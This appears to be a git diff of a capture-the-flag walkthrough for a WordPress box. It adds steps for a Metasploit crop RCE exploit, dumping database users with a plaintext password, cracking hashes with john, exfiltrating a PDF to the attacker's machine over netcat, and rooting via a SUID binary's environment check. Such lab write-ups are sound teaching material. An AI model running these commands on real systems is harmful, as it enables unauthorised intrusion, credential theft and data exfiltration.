@@ -120,12 +120,12 @@ After logging in the user couldn't really do anything but I noticed wordpress is
 ```
 msfconsole
 use exploit/multi/http/wp_crop_rce
-set rhosts 10.10.229.10
+set rhosts $VICTIM
 set username kwheel
 set password cutiepie1
 run
 shell
-python -c 'import pty; pty.spawn("/bin/bash")'
+python2 -c 'import pty; pty.spawn("/bin/bash")'
 id
 ```
 
@@ -133,29 +133,90 @@ id
 
 
 
+**Victim**
+
+```
+grep -i pass *
+```
+
+<figure><img src="../../.gitbook/assets/image (492).png" alt=""><figcaption></figcaption></figure>
 
 
 
+**Victim**
+
+```
+mysql -u wordpressuser -p
+Password: LittleYellowLamp90!@
+show databases;
+use blog;
+show tables;
+select * from wp_users;
+```
+
+<figure><img src="../../.gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>
 
 
 
+Tried brute forcing the hashes, we got the password for kwheel again but they aren't a user on the actual server. bjoel I wasn't able to bruteforce.
 
+**Kali**
 
+```
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
+<figure><img src="../../.gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>
 
+Found a pdf in bjoels home directory, after opening it up it looks like he was fired so his account is most likely locked anyways so there may be no point trying to break into it.
 
+**Kali(receiving)**
 
+```
+cd /home/bjoel
+nc -l -p 1234 > Billy_Joel_Termination_May20-2020.pdf
+```
 
+**Victim(sending)**
 
+```
+nc -w 3 $KALI 1234 < Billy_Joel_Termination_May20-2020.pdf
+```
 
+<figure><img src="../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>
 
+## **Privilege Escalation**
 
+**Victim**
 
+```
+find / -perm -u=s -type f 2> /dev/null 
+```
 
+<figure><img src="../../.gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>
 
+This script seems to just check if there is a admin environment variable is set, if it isn't it will exit.
 
+**Victim**
 
+```
+cd /usr/sbin
+ltrace checker
+```
 
+<figure><img src="../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>
 
+I add the admin environment variable then right away I got root after running the script
 
+**Victim**
 
+```
+env
+export admin=admin
+env
+/usr/sbin/checker
+```
+
+<figure><img src="../../.gitbook/assets/image (497).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (498).png" alt=""><figcaption></figcaption></figure>
